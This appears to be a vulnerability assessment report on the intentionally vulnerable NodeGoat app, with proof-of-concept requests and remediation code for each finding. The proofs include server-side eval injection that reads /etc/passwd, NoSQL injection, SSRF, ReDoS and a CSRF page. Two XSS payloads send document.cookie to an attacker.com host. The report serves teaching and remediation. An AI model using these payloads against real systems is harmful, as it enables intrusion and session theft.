# NodeGoat  Vulnerabilities 

## SECVULN-001: Server-Side JavaScript Injection via eval() in Contribution Module

### Metadata
- **Severity**: P0 (Critical)
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **CVSS 3.1**: 9.8 (Critical) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **Component**: `/app/routes/contributions.js` (Lines 32-34)
- **Fix Priority**: Immediate

### Description
The application directly passes user input to JavaScript's `eval()` function without any sanitization, enabling arbitrary code execution on the server. This critical vulnerability allows attackers to execute any JavaScript code in the context of the Node.js application server.

### Vulnerable Code
```javascript
// From /app/routes/contributions.js (Lines 32-34)
const preTax = eval(req.body.preTax);
const afterTax = eval(req.body.afterTax);
const roth = eval(req.body.roth);
```

### Attack Vector
User input from the contribution form fields (`preTax`, `afterTax`, `roth`) is passed directly to `eval()`. An attacker can submit malicious JavaScript code that will be executed on the server with the privileges of the application process.

### Technical Impact
- **Confidentiality**: Complete compromise of all data accessible to the Node.js process
- **Integrity**: Ability to modify data and application behavior
- **Availability**: Potential to crash the application or execute denial-of-service attacks

### Proof of Concept
```http
POST /contributions HTTP/1.1
Host: nodegoat.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid-session-cookie>

preTax=require('child_process').execSync('cat /etc/passwd').toString()&afterTax=0&roth=0
```

### Remediation
Replace `eval()` with proper type conversion functions:

```javascript
// Replace:
const preTax = eval(req.body.preTax);
const afterTax = eval(req.body.afterTax);
const roth = eval(req.body.roth);

// With:
const preTax = Number(req.body.preTax) || 0;
const afterTax = Number(req.body.afterTax) || 0;
const roth = Number(req.body.roth) || 0;

// Add validation
if (isNaN(preTax) || isNaN(afterTax) || isNaN(roth) || 
    preTax < 0 || afterTax < 0 || roth < 0) {
    return res.status(400).json({ error: "Invalid input values" });
}
```

### Additional Controls
1. Implement input validation using a schema validation library like Joi
2. Add Content Security Policy headers
3. Consider running the application with the Node.js `--disallow-code-generation-from-strings` flag

### References
1. [OWASP - Server Side JavaScript Injection](https://owasp.org/www-community/attacks/Server_Side_JavaScript_Injection)
2. [NodeJS Security Best Practices](https://nodejs.org/en/docs/guides/security)
3. [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)

---

## SECVULN-002: NoSQL Injection with JavaScript Execution in Allocations

### Metadata
- **Severity**: P0 (Critical)
- **CWE**: CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
- **CVSS 3.1**: 9.1 (Critical) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:M
- **Component**: `/app/data/allocations-dao.js` (Lines 77-79)
- **Fix Priority**: Immediate

### Description
The application contains a NoSQL injection vulnerability in the allocations module where user input is directly interpolated into a MongoDB query's `$where` clause without proper sanitization. This allows execution of arbitrary JavaScript code within the MongoDB context.

### Vulnerable Code
```javascript
// From /app/data/allocations-dao.js (Lines 77-79)
return {
    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`
};
```

### Attack Vector
The `threshold` parameter from a GET request to `/allocations/:userId` is directly interpolated into a MongoDB `$where` clause. An attacker can inject JavaScript code that will be executed by MongoDB when processing the query, potentially bypassing authorization controls.

### Technical Impact
- **Confidentiality**: Unauthorized access to data across user boundaries
- **Integrity**: Potential to manipulate query results affecting application logic
- **Availability**: Ability to execute resource-intensive operations causing database slowdowns

### Proof of Concept
```http
GET /allocations/1?threshold=0'; return this.userId == 2 || this.stocks > '0 HTTP/1.1
Host: nodegoat.example.com
Cookie: connect.sid=<valid-session-cookie>
```

This injects logic that returns allocations belonging to user ID 2, which should not be accessible to the current user.

### Remediation
Replace string interpolation with MongoDB's standard query operators:

```javascript
// Replace:
return {
    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`
};

// With:
const parsedThreshold = parseInt(threshold, 10);
if (isNaN(parsedThreshold) || parsedThreshold < 0) {
    return callback(new Error("Invalid threshold parameter"), null);
}

return {
    userId: parsedUserId,
    stocks: { $gt: parsedThreshold }
};
```

### Additional Controls
1. Implement comprehensive input validation for all query parameters
2. Consider using Mongoose schema validation
3. Disable JavaScript execution in MongoDB if not required (`--noscripting`)
4. Implement database query monitoring

### References
1. [OWASP - NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
2. [MongoDB - Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)
3. [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)

---

## SECVULN-003: Server-Side Request Forgery (SSRF) in Research Feature

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-918 (Server-Side Request Forgery)
- **CVSS 3.1**: 8.3 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
- **Component**: `/app/routes/research.js` (Lines 15-16)
- **Fix Priority**: High (Within 7 days)

### Description
The application contains a Server-Side Request Forgery (SSRF) vulnerability in the research feature. The application concatenates user-provided URL and symbol parameters to create a target URL for HTTP requests without proper validation, allowing an attacker to make the server request internal resources or external services.

### Vulnerable Code
```javascript
// From /app/routes/research.js (Lines 15-16)
const url = req.query.url + req.query.symbol;
return needle.get(url, (error, newResponse, body) => {
    // Process response...
});
```

### Attack Vector
The `url` and `symbol` parameters from a GET request to `/research` are concatenated without validation to form a URL for an HTTP request. An attacker can manipulate these parameters to make the server request internal network resources or arbitrary external services.

### Technical Impact
- **Confidentiality**: Access to internal resources that should not be exposed externally
- **Integrity**: Potential to trigger state-changing operations on internal services
- **Availability**: Possible denial of service by directing requests to services that cannot handle the load

### Proof of Concept
```http
GET /research?url=http://localhost:27017/&symbol= HTTP/1.1
Host: nodegoat.example.com
Cookie: connect.sid=<valid-session-cookie>
```

This request would make the server connect to the local MongoDB instance, potentially exposing database information.

### Remediation
Use a fixed base URL and only allow the user to control the symbol part:

```javascript
// Replace:
const url = req.query.url + req.query.symbol;

// With:
const allowedBaseUrl = "https://finance.yahoo.com/quote/";
const symbol = req.query.symbol ? encodeURIComponent(req.query.symbol) : "";
const url = allowedBaseUrl + symbol;
```

### Additional Controls
1. Implement a URL validation function that checks against an allowlist of domains
2. Add network-level controls (firewall rules, network segmentation)
3. Use an HTTP proxy that validates and filters outbound requests
4. Implement strict Content Security Policy headers

### References
1. [OWASP - Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
2. [PortSwigger - Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
3. [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

## SECVULN-004: Regular Expression Denial of Service (ReDoS) in Profile Validation

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-1333 (Inefficient Regular Expression Complexity)
- **CVSS 3.1**: 7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
- **Component**: `/app/routes/profile.js` (Line 59)
- **Fix Priority**: High (Within 7 days)

### Description
The application contains a Regular Expression Denial of Service (ReDoS) vulnerability in the profile validation functionality. The vulnerable regex pattern with nested repetition quantifiers can cause catastrophic backtracking, leading to CPU exhaustion and application unresponsiveness when processing certain malicious inputs.

### Vulnerable Code
```javascript
// From /app/routes/profile.js (Line 59)
const regexPattern = /([0-9]+)+\#/;
if (bankRouting && !regexPattern.test(bankRouting)) {
    errors.push("Bank Routing number does not comply with format specifications");
}
```

### Attack Vector
The `bankRouting` parameter from a POST request to `/profile` is validated using a regex with nested repetition quantifiers. An attacker can submit a specially crafted string that causes the regex engine to enter an exponential matching state, consuming 100% CPU for an extended period.

### Technical Impact
- **Confidentiality**: No direct impact on confidentiality
- **Integrity**: No direct impact on data integrity
- **Availability**: Severe impact - can cause complete denial of service for all users by blocking the Node.js event loop

### Proof of Concept
```http
POST /profile HTTP/1.1
Host: nodegoat.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid-session-cookie>

bankRouting=1111111111111111111111111111111111111111111111a&bankAcc=12345
```

This input causes the regex engine to explore an exponential number of potential matches, freezing the application.

### Remediation
Replace the vulnerable regex with a safer pattern that avoids nested repetition:

```javascript
// Replace:
const regexPattern = /([0-9]+)+\#/;

// With:
const regexPattern = /^[0-9]+\#$/;

// For better bank routing validation, use:
const regexPattern = /^[0-9]{9}\#$/;  // ABA routing numbers are 9 digits
```

### Additional Controls
1. Add input length restrictions before applying regex
2. Implement regex timeouts using libraries like `safe-regex-timeout`
3. Move regex processing to a separate worker thread
4. Use static analysis tools to detect vulnerable regex patterns

### References
1. [OWASP - Regular Expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
2. [CWE-1333: Inefficient Regular Expression Complexity](https://cwe.mitre.org/data/definitions/1333.html)
3. [Node.js - Don't Block the Event Loop](https://nodejs.org/en/docs/guides/dont-block-the-event-loop)
4. [OWASP - Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)

---

## SECVULN-005: Insecure Direct Object Reference (IDOR) in Allocations

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)
- **CVSS 3.1**: 6.5 (Medium) - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **Component**: `/app/routes/allocations.js` (Lines 16-19)
- **Fix Priority**: High (Within 7 days)

### Description
The application contains an Insecure Direct Object Reference (IDOR) vulnerability in the allocations feature. The application uses the user ID from URL parameters instead of the authenticated user's session to determine which allocations to display, allowing users to access other users' financial data.

### Vulnerable Code
```javascript
// From /app/routes/allocations.js (Lines 16-19)
exports.displayAllocations = (req, res, next) => {
    const { userId } = req.params;
    allocationsDAO.getByUserId(userId, (err, allocations) => {
        // ... renders allocations of the requested userId, not the authenticated user
    });
};
```

### Attack Vector
The `userId` parameter from the URL path `/allocations/:userId` is used directly to retrieve and display allocations. An authenticated user can simply change the user ID in the URL to access another user's financial information without authorization.

### Technical Impact
- **Confidentiality**: Severe breach - unauthorized access to other users' financial allocation data
- **Integrity**: No direct impact on data integrity
- **Availability**: No direct impact on availability

### Proof of Concept
```http
GET /allocations/2 HTTP/1.1
Host: nodegoat.example.com
Cookie: connect.sid=<valid-session-for-user-1>
```

A user with ID 1 can access allocations for user ID 2 simply by changing the URL parameter.

### Remediation
Use the authenticated user's ID from the session instead of the URL parameter:

```javascript
// Replace:
exports.displayAllocations = (req, res, next) => {
    const { userId } = req.params;
    // ...
};

// With:
exports.displayAllocations = (req, res, next) => {
    const userId = req.session.userId;
    
    if (!userId) {
        return res.redirect("/login");
    }
    
    allocationsDAO.getByUserId(userId, (err, allocations) => {
        // ...
    });
};
```

### Additional Controls
1. Implement a reusable authorization middleware to verify resource ownership
2. Set up role-based access control (RBAC) for more granular permissions
3. Use indirect reference maps instead of direct IDs in URLs
4. Add comprehensive access control logging and monitoring

### References
1. [OWASP - Insecure Direct Object References](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
2. [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
3. [OWASP - Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
4. [OWASP ASVS - V4: Access Control Requirements](https://owasp.org/www-project-application-security-verification-standard/)

---

## SECVULN-006: Plaintext Password Storage and Comparison

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-521 (Weak Password Requirements)
- **CVSS 3.1**: 7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Component**: `/app/data/user-dao.js` (lines 25-30 and 60-67)
- **Fix Priority**: High (Within 7 days)

### Description
The application stores user passwords in plaintext in the MongoDB database rather than using cryptographic hashing. Additionally, during login, the application performs plaintext password comparison. This critical vulnerability puts all user passwords at risk in case of a data breach.

### Vulnerable Code
```javascript
// Password Storage - From /app/data/user-dao.js (lines 25-30)
this.insertOne = (user, callback) => {
    // Note: no hashing of password
    usersCol.insertOne(user, (err, result) => {
        if (err) return callback(err, null);
        callback(null, result);
    });
};

// Password Comparison - From /app/data/user-dao.js (lines 60-67)
this.validateLogin = (userName, password, callback) => {
    usersCol.findOne({
        userName: userName,
        password: password // Direct plaintext comparison
    }, (err, user) => {
        if (err) return callback(err, null);
        callback(null, user);
    });
};
```

### Attack Vector
This is not directly exploitable but becomes critical if combined with other vulnerabilities like SQL injection that provide access to the database. If an attacker gains read access to the database, they immediately obtain all user passwords in plaintext.

### Technical Impact
- **Confidentiality**: Severe impact - Complete exposure of all user credentials
- **Integrity**: Indirect impact - If credentials are compromised, attackers can impersonate users
- **Availability**: No direct impact on availability

### Proof of Concept
If an attacker gains access to the MongoDB database, a simple query reveals all passwords:

```javascript
db.users.find({}, {userName: 1, password: 1});
```

### Remediation
Implement password hashing with bcrypt:

```javascript
// For user creation:
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 10;

this.insertOne = (user, callback) => {
    // Hash the password before storing
    bcrypt.hash(user.password, SALT_ROUNDS, (err, hashedPassword) => {
        if (err) return callback(err, null);
        
        // Replace plaintext password with hashed version
        user.password = hashedPassword;
        
        usersCol.insertOne(user, (err, result) => {
            if (err) return callback(err, null);
            callback(null, result);
        });
    });
};

// For login validation:
this.validateLogin = (userName, password, callback) => {
    usersCol.findOne({ userName: userName }, (err, user) => {
        if (err) return callback(err, null);
        if (!user) return callback(null, null);
        
        bcrypt.compare(password, user.password, (err, isMatch) => {
            if (err) return callback(err, null);
            if (!isMatch) return callback(null, null);
            
            // Password matches, return user object
            callback(null, user);
        });
    });
};
```

### Additional Controls
1. Implement a password migration strategy for existing users
2. Add password strength requirements and validation
3. Implement account lockout after failed login attempts
4. Consider adding multi-factor authentication
5. Set up breach detection monitoring

### References
1. [OWASP - Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
2. [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
3. [NIST SP 800-63B: Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
4. [OWASP ASVS - V2: Authentication Verification Requirements](https://owasp.org/www-project-application-security-verification-standard/)

## SECVULN-007: Stored XSS in Memos

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **CVSS 3.1**: 8.1 (High) - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
- **Component**: `/app/routes/memos.js` and `/app/data/memos-dao.js`
- **Fix Priority**: High (Within 7 days)

### Description
The application contains a stored Cross-Site Scripting (XSS) vulnerability in the memo functionality. User-submitted memo content is stored in the database without sanitization and later displayed without proper HTML escaping. Additionally, the templating engine (Swig) is configured with `autoescape: false`, which disables automatic HTML escaping.

### Vulnerable Code
```javascript
// Memo Storage Without Sanitization
// From /app/data/memos-dao.js
this.insert = (memo, callback) => {
    const memos = {
        memo: memo, // No sanitization before storage
        timestamp: new Date()
    };

    memosCol.insertOne(memos, (err, result) => {
        if (err) return callback(err, null);
        callback(null, result);
    });
};

// Template Engine Configuration
// From /server.js (line 137)
swig.setDefaults({
    cache: false,
    autoescape: false // Disables automatic HTML escaping
});

// In the memo display template
<div class="memo-content">
    {{ memo.memo }} <!-- Direct insertion without escaping -->
</div>
```

### Attack Vector
An authenticated user can submit a memo containing malicious JavaScript via the memo form. Since the content is stored without sanitization and rendered without escaping, the JavaScript will execute in the browser of any user who views the memos page, including administrators.

### Technical Impact
- **Confidentiality**: Severe impact - Attackers can steal cookies, session tokens, and access sensitive page content
- **Integrity**: High impact - Attackers can modify page content and perform actions as the victim
- **Availability**: Moderate impact - Attack payloads could crash the victim's browser

### Proof of Concept
```http
POST /memos HTTP/1.1
Host: nodegoat.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid-session-cookie>

memo=<script>fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie));</script>
```

### Remediation

1. Enable automatic HTML escaping in Swig:
```javascript
// In server.js
swig.setDefaults({
    cache: false,
    autoescape: true // Enable automatic HTML escaping
});
```

2. Implement input sanitization before storage:
```javascript
const sanitizeHtml = require('sanitize-html');

// In memos-dao.js
this.insert = (memo, callback) => {
    // Sanitize the memo content
    const sanitizedMemo = sanitizeHtml(memo, {
        allowedTags: ['p', 'br', 'b', 'i', 'em', 'strong', 'a'],
        allowedAttributes: {
            'a': ['href']
        }
    });
    
    const memos = {
        memo: sanitizedMemo,
        timestamp: new Date()
    };

    memosCol.insertOne(memos, (err, result) => {
        if (err) return callback(err, null);
        callback(null, result);
    });
};
```

### Additional Controls
1. Implement Content Security Policy (CSP) headers
2. Consider using markdown instead of HTML for formatted content
3. Add client-side sanitization using libraries like DOMPurify
4. Implement output encoding in templates

### References
1. [OWASP - Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
2. [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
3. [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
4. [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

## SECVULN-008: Missing CSRF Protection

### Metadata
- **Severity**: P2 (Medium)
- **CWE**: CWE-352 (Cross-Site Request Forgery)
- **CVSS 3.1**: 6.4 (Medium) - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:H/A:N
- **Component**: `/server.js` (lines 104-113, commented out)
- **Fix Priority**: Medium (Within 14 days)

### Description
The application has commented out CSRF protection mechanisms in the server configuration and does not implement alternative protections. This leaves all state-changing POST requests vulnerable to Cross-Site Request Forgery (CSRF) attacks, where attackers can trick users into making unintended requests to the application.

### Vulnerable Code
```javascript
// From /server.js (lines 104-113)
/*
// Enable Express csrf protection
app.use(csrf());
// Make csrf token available in templates
app.use(function(req, res, next) {
    res.locals.csrftoken = req.csrfToken();
    next();
});
*/

// Example of vulnerable route handler
// From /app/routes/profile.js (no CSRF check)
app.post('/profile', profileHandler.handleProfileUpdate);
```

### Attack Vector
An attacker creates a malicious website that automatically submits a form to the NodeGoat application when visited by a victim who is already authenticated to the application. Since CSRF protection is disabled, the application processes the request with the victim's session credentials.

### Technical Impact
- **Confidentiality**: Low impact - CSRF itself doesn't directly compromise confidentiality
- **Integrity**: High impact - Attackers can perform unauthorized state-changing operations on behalf of victims
- **Availability**: No direct impact on availability

### Proof of Concept
```html
<!DOCTYPE html>
<html>
<head>
  <title>Win a Prize!</title>
</head>
<body onload="document.getElementById('csrf-form').submit()">
  <h1>Congratulations, you've won a prize!</h1>
  <p>Please wait while we redirect you to the prize claim page...</p>
  
  <!-- Hidden form that automatically submits -->
  <form id="csrf-form" action="http://nodegoat.example.com/profile" method="POST" style="display:none">
    <input type="hidden" name="firstName" value="Hacked" />
    <input type="hidden" name="lastName" value="Account" />
    <input type="hidden" name="bankAcc" value="9876543210" />
    <input type="hidden" name="bankRouting" value="12345#" />
  </form>
</body>
</html>
```

### Remediation

1. Uncomment and implement the CSRF protection code:
```javascript
// In server.js
const csrf = require('csurf');

// Enable Express csrf protection
app.use(csrf({ cookie: true }));

// Make csrf token available in templates
app.use((req, res, next) => {
    res.locals.csrftoken = req.csrfToken();
    next();
});
```

2. Update all forms to include the CSRF token:
```html
<!-- In form templates -->
<form method="POST" action="/profile">
  <input type="hidden" name="_csrf" value="{{csrftoken}}">
  <!-- Other form fields -->
</form>
```

### Additional Controls
1. Configure cookies with SameSite=Strict or Lax attributes
2. Use custom request headers for AJAX requests
3. Implement the double submit cookie pattern as an alternative
4. Consider using token-based authentication (like JWT) with proper implementation

### References
1. [OWASP - Cross-Site Request Forgery](https://owasp.org/www-community/attacks/csrf)
2. [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
3. [OWASP - CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
4. [SameSite Cookies Explained](https://web.dev/articles/samesite-cookies-explained)

---

## SECVULN-009: Prototype Pollution Vulnerability

### Metadata
- **Severity**: P2 (Medium)
- **CWE**: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)
- **CVSS 3.1**: 6.5 (Medium) - CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:L
- **Component**: `/app/routes/profile.js` (lines 33-36 and 100-103)
- **Fix Priority**: Medium (Within 14 days)

### Description
The application contains a potential prototype pollution vulnerability in the profile functionality. Object spreading is used to merge user data into render objects without validating property names. This could allow an attacker to modify JavaScript's Object prototype, potentially affecting the behavior of the entire application.

### Vulnerable Code
```javascript
// From /app/routes/profile.js (lines 100-103)
return res.render("profile", {
    ...doc,
    userId: userId,
    environmentalScripts
});

// Another instance
// From /app/routes/profile.js (lines 33-36)
return res.render("profile", {
    ...user,
    userId: userId,
    environmentalScripts
});
```

### Attack Vector
If an attacker can inject an object with a `__proto__` property into user data (possibly via another vulnerability like NoSQL injection), they could pollute the Object prototype. When the application spreads this data into the render object, the pollution could affect all JavaScript objects in the application.

### Technical Impact
- **Confidentiality**: Low impact - Could potentially bypass security controls
- **Integrity**: High impact - Could modify application behavior or enable other attacks
- **Availability**: Low impact - Could cause application instability or errors

### Proof of Concept
If an attacker can inject a document with a malicious `__proto__` property:

```javascript
// Assuming the NoSQL injection from SECVULN-002 can be used
// This is a theoretical exploit that would require chaining with another vulnerability
db.users.updateOne(
  { userName: 'victim' },
  { $set: { '__proto__': { 'isAdmin': true, 'environmentalScripts': '<script>alert("XSS")</script>' } } }
);
```

### Remediation

1. Use explicit property copying instead of object spreading:
```javascript
// Replace:
return res.render("profile", {
    ...doc,
    userId: userId,
    environmentalScripts
});

// With:
const safeDoc = {
    firstName: doc.firstName || '',
    lastName: doc.lastName || '',
    phone: doc.phone || '',
    email: doc.email || '',
    // Add other legitimate properties as needed
};

return res.render("profile", {
    ...safeDoc,
    userId: userId,
    environmentalScripts
});
```

### Additional Controls
1. Implement property name validation to detect dangerous property names
2. Consider using Map instead of Object for user-controlled data
3. Use Object.freeze(Object.prototype) in sensitive contexts
4. Set up MongoDB schema validation to reject documents with specific property names

### References
1. [OWASP - Prototype Pollution](https://owasp.org/www-community/vulnerabilities/Prototype_Pollution)
2. [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)
3. [HackerOne - Prototype Pollution Tutorial](https://www.hackerone.com/knowledge-center/prototype-pollution-javascript-vulnerability)
4. [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

## SECVULN-010: XSS via Context Confusion

### Metadata
- **Severity**: P2 (Medium)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **CVSS 3.1**: 6.1 (Medium) - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
- **Component**: `/app/routes/profile.js` (Line 28)
- **Fix Priority**: Medium (Within 14 days)

### Description
The application contains a Cross-Site Scripting (XSS) vulnerability due to context confusion in the profile functionality. The website URL is HTML-encoded but then used in an href attribute context, which allows JavaScript URLs to be injected and executed when clicked.

### Vulnerable Code
```javascript
// From /app/routes/profile.js (Line 28)
doc.website = ESAPI.encoder().encodeForHTML(doc.website);

// Later in the template
<a href="{{user.website}}" target="_blank">{{user.website}}</a>
```

### Attack Vector
An authenticated user can update their profile with a JavaScript URL (e.g., `javascript:alert(document.cookie)`) in the website field. HTML encoding doesn't affect JavaScript URLs since they don't contain HTML-special characters. When another user clicks the link, the JavaScript executes in their browser context.

### Technical Impact
- **Confidentiality**: Low impact - Can steal cookies and access sensitive page content if the link is clicked
- **Integrity**: Low impact - Can modify page content or perform actions as the victim
- **Availability**: No significant impact on availability

### Proof of Concept
```http
POST /profile HTTP/1.1
Host: nodegoat.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid-session-cookie>

website=javascript:fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))&firstName=John&lastName=Doe
```

### Remediation

1. Validate URL protocol and use proper URL encoding:
```javascript
// Replace:
doc.website = ESAPI.encoder().encodeForHTML(doc.website);

// With:
function validateAndEncodeUrl(url) {
    // Check if URL is empty or undefined
    if (!url) return '';
    
    // Ensure URL has a protocol, default to http:// if missing
    if (!url.match(/^[a-zA-Z]+:\/\//)) {
        url = 'http://' + url;
    }
    
    try {
        const parsedUrl = new URL(url);
        // Allow only http and https protocols
        if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
            return '#';
        }
        return parsedUrl.href;
    } catch (e) {
        // Invalid URL
        return '#';
    }
}

doc.website = validateAndEncodeUrl(doc.website);
```

### Additional Controls
1. Implement Content Security Policy headers
2. Add rel="noopener noreferrer" to external links
3. Use template engines with context-aware encoding
4. Consider restricting URLs to an allowlist of trusted domains

### References
1. [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
2. [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
3. [OWASP - Contextual Output Encoding](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
4. [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## SECVULN-011: Session Management Weaknesses

### Metadata
- **Severity**: P1 (High)
- **CWE**: CWE-384 (Session Fixation)
- **CVSS 3.1**: 7.4 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
- **Component**: `/app/routes/session.js` (lines 116-117) and `/server.js` (lines 78-102)
- **Fix Priority**: High (Within 7 days)

### Description
The application contains multiple session management vulnerabilities that significantly weaken authentication security. It does not regenerate session IDs after successful authentication (the code to do so is commented out), and session cookies lack security attributes such as `httpOnly` and `secure` flags. These issues make the application vulnerable to session fixation and session hijacking attacks.

### Vulnerable Code
```javascript
// Missing Session Regeneration
// From /app/routes/session.js (lines 116-117)
// req.session.regenerate(() => {
req.session.userId = user._id;
// });

// Insecure Session Configuration
// From /server.js (lines 78-102)
app.use(session({
    secret: cookieSecret,
    saveUninitialized: true,
    resave: true,
    // Missing secure, httpOnly, sameSite settings
}));
```

### Attack Vector
1. **Session Fixation**: An attacker obtains a valid session ID, tricks a victim into using that ID (through URL parameters, XSS on another site, etc.), and then inherits the authenticated session after the victim logs in.

2. **Session Hijacking**: Due to missing `httpOnly` and `secure` flags, attackers can steal session cookies via XSS attacks or by intercepting unencrypted network traffic.

### Technical Impact
- **Confidentiality**: High impact - Attackers can gain unauthorized access to user accounts and sensitive information
- **Integrity**: High impact - Attackers can perform actions as the victim
- **Availability**: No direct impact on availability

### Proof of Concept
**Session Fixation Test**:
1. Get a session ID by visiting the application
2. Use that session ID in another browser or incognito window
3. Log in through the second browser
4. Verify that the original browser now has an authenticated session

```http
# Step 1: Visit app, inspect cookies to get session ID
GET / HTTP/1.1
Host: nodegoat.example.com

# Response includes:
Set-Cookie: connect.sid=ABC123; path=/

# Step 2: In another browser, set this cookie and log in
GET / HTTP/1.1
Host: nodegoat.example.com
Cookie: connect.sid=ABC123

# Then log in
POST /login HTTP/1.1
Host: nodegoat.example.com
Cookie: connect.sid=ABC123
Content-Type: application/x-www-form-urlencoded

userName=victim&password=victimpass

# Step 3: In original browser, access protected resource
GET /profile HTTP/1.1
Host: nodegoat.example.com
Cookie: connect.sid=ABC123

# If vulnerable, this succeeds without authentication
```

### Remediation

1. Enable Session Regeneration:
```javascript
// In /app/routes/session.js
req.session.regenerate((err) => {
    if (err) {
        return res.redirect("/login");
    }
    req.session.userId = user._id;
    return res.redirect(user.isAdmin ? "/benefits" : "/dashboard");
});
```

2. Secure Cookie Configuration:
```javascript
// In /server.js
app.use(session({
    secret: cookieSecret,
    saveUninitialized: false, // Don't create session until something stored
    resave: false, // Don't save session if unmodified
    cookie: {
        httpOnly: true, // Prevent client-side JS from reading cookie
        secure: true, // Only send cookie over HTTPS
        sameSite: 'lax', // Protect against CSRF
        maxAge: 3600000 // 1 hour expiration
    }
}));
```

### Additional Controls
1. Implement proper session termination on logout:
```javascript
app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            console.error("Error destroying session:", err);
        }
        res.clearCookie('connect.sid');
        res.redirect('/login');
    });
});
```

2. Add session timeout controls:
```javascript
// Track last activity time
app.use((req, res, next) => {
    req.session.lastActivity = Date.now();
    if (!req.session.createdAt) {
        req.session.createdAt = Date.now();
    }
    next();
});

// Check timeouts
const sessionTimeoutMiddleware = (req, res, next) => {
    const now = Date.now();
    const idleTimeout = 15 * 60 * 1000; // 15 minutes
    const absoluteTimeout = 4 * 60 * 60 * 1000; // 4 hours
    
    if (req.session.lastActivity && (now - req.session.lastActivity > idleTimeout)) {
        return req.session.destroy(() => res.redirect('/login?timeout=idle'));
    }
    
    next();
};

app.use(sessionTimeoutMiddleware);
```

3. Use a production-ready session store:
```javascript
const MongoStore = require('connect-mongo');

app.use(session({
    // ... other options
    store: MongoStore.create({
        mongoUrl: config.db,
        crypto: {
            secret: cookieSecret
        }
    })
}));
```

4. Consider implementing multi-factor authentication

### References
1. [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
2. [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
3. [OWASP - Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
